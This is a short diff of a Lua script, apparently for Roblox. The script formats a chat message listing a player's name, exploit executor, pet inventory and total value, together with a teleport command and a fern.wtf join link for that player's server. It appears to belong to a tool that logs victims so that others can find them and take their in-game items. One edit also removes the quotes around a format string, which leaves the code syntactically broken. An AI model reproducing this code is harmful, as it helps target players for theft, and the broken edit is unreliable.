@@ -323,7 +323,7 @@
         local maxPlayers = tostring(Players.MaxPlayers or "?")
         local timeStr = os.date("%I:%M %p")
         local dateStr = os.date("%m/%d/%y")
-        local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
+        local teleportCmd = string.format(game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s"), placeId, jobId)
         local teleportDisplay = string.format('%s | %s', placeId, jobId)
         local joinUrl = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)
 
@@ -344,7 +344,7 @@
         local playerInfoSection = string.format("```Name: %s\nExecutor: %s\nAccount Age: %s days\nPlayers in game: %s/%s```", playerName, executor, "72", playerCount, maxPlayers)
         
         local description = string.format(
-            ":bust_in_silhouette: **Player Information**\n%s\n💰 **Total Value:**\n```%s```\n🐕 **Pets Found:**\n```%s```\n\n🔗 **Game Link:** [Click to join](%s)\n`%s`",
+            ":bust_in_silhouette: **Player Information**\n%s\n💰 **Total Value:**\n```%s```\n🐕 **Pets Found:**\n```%s```\n🔗 **Game Link:** [Click to join](%s)\n\n -# %s",
             playerInfoSection,
             totalValueStr,
             petListStr,
